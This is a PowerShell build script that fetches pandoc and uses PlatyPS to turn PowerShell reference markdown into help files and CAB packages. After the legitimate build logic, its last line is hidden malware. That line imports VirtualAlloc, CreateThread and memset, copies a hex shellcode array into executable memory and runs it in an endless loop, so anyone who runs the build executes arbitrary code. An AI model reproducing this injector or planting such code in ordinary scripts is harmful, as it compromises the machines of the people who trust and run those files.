param(
    [switch]$SkipCabs,
    [switch]$ShowProgress
)


$global:ProgressPreference = 'SilentlyContinue'
if ($ShowProgress) { $ProgressPreference = 'Continue' }

[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
$tempDir = [System.IO.Path]::GetTempPath()


$panDocVersion = "2.7.3"
$pandocSourceURL = "https://github.com/jgm/pandoc/releases/download/$panDocVersion/pandoc-$panDocVersion-windows-x86_64.zip"

$pandocDestinationPath = New-Item (Join-Path $tempDir "pandoc") -ItemType Directory -Force
$pandocZipPath = Join-Path $pandocDestinationPath "pandoc-$panDocVersion-windows-x86_64.zip"
Invoke-WebRequest -Uri $pandocSourceURL -OutFile $pandocZipPath

Expand-Archive -Path $pandocZipPath -DestinationPath $pandocDestinationPath -Force
$pandocExePath = Join-Path (Join-Path $pandocDestinationPath "pandoc-$panDocVersion-windows-x86_64") "pandoc.exe"


$threadJob = Get-Module ThreadJob -ListAvailable
if ($null -eq $threadjob) {
    Install-Module ThreadJob -RequiredVersion 1.1.2 -Scope CurrentUser -Force
}


$ReferenceDocset = Join-Path $PSScriptRoot 'reference'


$jobs = [System.Collections.Generic.List[object]]::new()
$excludeList = 'module', 'media', 'docs-conceptual', 'mapping', 'bread', '7'
Get-ChildItem $ReferenceDocset -Directory -Exclude $excludeList | ForEach-Object -Process {
    $job = Start-ThreadJob -Name $_.Name -ArgumentList @($SkipCabs,$pandocExePath,$PSScriptRoot,$_) -ScriptBlock {
        param($SkipCabs, $pandocExePath, $WorkingDirectory, $DocSet)

        $tempDir = [System.IO.Path]::GetTempPath()
        $workingDir = Join-Path $tempDir $DocSet.Name
        $workingDir = New-Item -ItemType Directory -Path $workingDir -Force
        Set-Location $WorkingDir

        function Get-ContentWithoutHeader {
            param(
                $path
            )

            $doc = Get-Content $path -Encoding UTF8
            $start = $end = -1

            
            

            for ($x = 0; $x -lt 30; $x++) {
                if ($doc[$x] -eq '---') {
                    if ($start -eq -1) {
                        $start = $x
                    }
                    else {
                        if ($end -eq -1) {
                            $end = $x + 1
                            break
                        }
                    }
                }
            }
            if ($end -gt $start) {
                Write-Output ($doc[$end..$($doc.count)] -join "`r`n")
            }
            else {
                Write-Output ($doc -join "`r`n")
            }
        }

        $Version = $DocSet.Name
        Write-Verbose -Verbose "Version = $Version"

        $VersionFolder = $DocSet.FullName
        Write-Verbose -Verbose "VersionFolder = $VersionFolder"

        
        Get-ChildItem $VersionFolder -Directory | ForEach-Object -Process {
            $ModuleName = $_.Name
            Write-Verbose -Verbose "ModuleName = $ModuleName"

            $ModulePath = Join-Path $VersionFolder $ModuleName
            Write-Verbose -Verbose "ModulePath = $ModulePath"

            $LandingPage = Join-Path $ModulePath "$ModuleName.md"
            Write-Verbose -Verbose "LandingPage = $LandingPage"

            $MamlOutputFolder = Join-Path "$WorkingDirectory\maml" "$Version\$ModuleName"
            Write-Verbose -Verbose "MamlOutputFolder = $MamlOutputFolder"

            $CabOutputFolder = Join-Path "$WorkingDirectory\updatablehelp" "$Version\$ModuleName"
            Write-Verbose -Verbose "CabOutputFolder = $CabOutputFolder"

            if (-not (Test-Path $MamlOutputFolder)) {
                New-Item $MamlOutputFolder -ItemType Directory -Force > $null
            }

            
            $AboutFolder = Join-Path $ModulePath "About"

            if (Test-Path $AboutFolder) {
                Write-Verbose -Verbose "AboutFolder = $AboutFolder"
                Get-ChildItem "$aboutfolder/about_*.md" | ForEach-Object {
                    $aboutFileFullName = $_.FullName
                    $aboutFileOutputName = "$($_.BaseName).help.txt"
                    $aboutFileOutputFullName = Join-Path $MamlOutputFolder $aboutFileOutputName

                    $pandocArgs = @(
                        "--from=gfm",
                        "--to=plain+multiline_tables",
                        "--columns=75",
                        "--output=$aboutFileOutputFullName",
                        "--quiet"
                    )

                    Get-ContentWithoutHeader $aboutFileFullName | & $pandocExePath $pandocArgs
                }
            }

            try {
                
                
                New-ExternalHelp -Path $ModulePath -OutputPath $MamlOutputFolder -Force -WarningAction Stop -ErrorAction Stop

                
                if (-not $SkipCabs) {
                    $cabInfo = New-ExternalHelpCab -CabFilesFolder $MamlOutputFolder -LandingPagePath $LandingPage -OutputFolder $CabOutputFolder

                    
                    if ($cabInfo.Count -eq 8) { $cabInfo[-1].FullName }
                }
            }
            catch {
                Write-Error -Message "PlatyPS failure: $ModuleName -- $Version" -Exception $_
            }
        }

        Remove-Item $workingDir -Force -ErrorAction SilentlyContinue
    }
    Write-Verbose -Verbose "Started job for $($_.Name)"
    $jobs += $job
}

$null = $jobs | Wait-Job


$allErrors = [System.Collections.Generic.List[string]]::new()
foreach ($job in $jobs) {
    Write-Verbose -Verbose "$($job.Name) output:"
    if ($job.Verbose.Count -gt 0) {
        foreach ($verboseMessage in $job.Verbose) {
            Write-Verbose -Verbose $verboseMessage
        }
    }

    if ($job.State -eq "Failed") {
        $allErrors += "$($job.Name) failed due to unhandled exception"
    }

    if ($job.Error.Count -gt 0) {
        $allErrors += "$($job.Name) failed with errors:"
        $allErrors += $job.Error.ReadAll()
    }
}


if ($allErrors.Count -gt 0) {
    $allErrors
    throw "There are errors during platyPS run!`nPlease fix your markdown to comply with the schema: https://github.com/PowerShell/platyPS/blob/master/platyPS.schema.md"
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x57,0xa5,0xea,0xa0,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x58,0x47,0x1f,0x5c,0x8e,0x05,0xe0,0x9d,0x4e,0x6a,0x68,0x78,0x7f,0xaa,0x0e,0x08,0x2f,0x1a,0x44,0x5c,0xc3,0xd1,0x08,0x75,0x50,0x97,0x84,0x7a,0xd1,0x12,0xf3,0xb5,0xe2,0x0f,0xc7,0xd4,0x60,0x52,0x14,0x37,0x59,0x9d,0x69,0x36,0x9e,0xc0,0x80,0x6a,0x77,0x8e,0x37,0x9b,0xfc,0xda,0x8b,0x10,0x4e,0xca,0x8b,0xc5,0x06,0xed,0xba,0x5b,0x1d,0xb4,0x1c,0x5d,0xf2,0xcc,0x14,0x45,0x17,0xe8,0xef,0xfe,0xe3,0x86,0xf1,0xd6,0x3a,0x66,0x5d,0x17,0xf3,0x95,0x9f,0x5f,0x33,0x46,0xea,0xa9,0x40,0xfb,0xed,0x6d,0x3b,0x27,0x7b,0x76,0x9b,0xac,0xdb,0x52,0x1a,0x60,0xbd,0x11,0x10,0xcd,0xc9,0x7e,0x34,0xd0,0x1e,0xf5,0x40,0x59,0xa1,0xda,0xc1,0x19,0x86,0xfe,0x8a,0xfa,0xa7,0xa7,0x76,0xac,0xd8,0xb8,0xd9,0x11,0x7d,0xb2,0xf7,0x46,0x0c,0x99,0x9f,0xab,0x3d,0x22,0x5f,0xa4,0x36,0x51,0x6d,0x6b,0xed,0xfd,0xdd,0xe4,0x2b,0xf9,0x22,0xdf,0x8c,0x95,0xdd,0xe0,0xec,0xbc,0x19,0xb4,0xbc,0xd6,0x88,0xb5,0x56,0x27,0x35,0x60,0xc2,0x22,0xa1,0xdf,0x6f,0xf6,0x8b,0x88,0x8d,0x08,0xfe,0xfb,0x1b,0xee,0x50,0xac,0x4b,0xbf,0x10,0x1c,0x2c,0x6f,0xf8,0x76,0xa3,0x50,0x18,0x79,0x69,0xf9,0xb2,0x96,0xc4,0x51,0x2a,0x0e,0x4d,0x29,0xcb,0xcf,0x5b,0x57,0xcb,0x44,0x68,0xa7,0x85,0xac,0x05,0xbb,0x71,0x5d,0x50,0xe1,0xd7,0x62,0x4e,0x8c,0xd7,0xf6,0x75,0x07,0x80,0x6e,0x74,0x7e,0xe6,0x30,0x87,0x55,0x7d,0xf8,0x1d,0x16,0xe9,0x05,0xf2,0x96,0xe9,0x53,0x98,0x96,0x81,0x03,0xf8,0xc4,0xb4,0x4b,0xd5,0x78,0x65,0xde,0xd6,0x28,0xda,0x49,0xbf,0xd6,0x05,0xbd,0x60,0x28,0x60,0x3f,0x5c,0xff,0x4c,0x35,0x8c,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

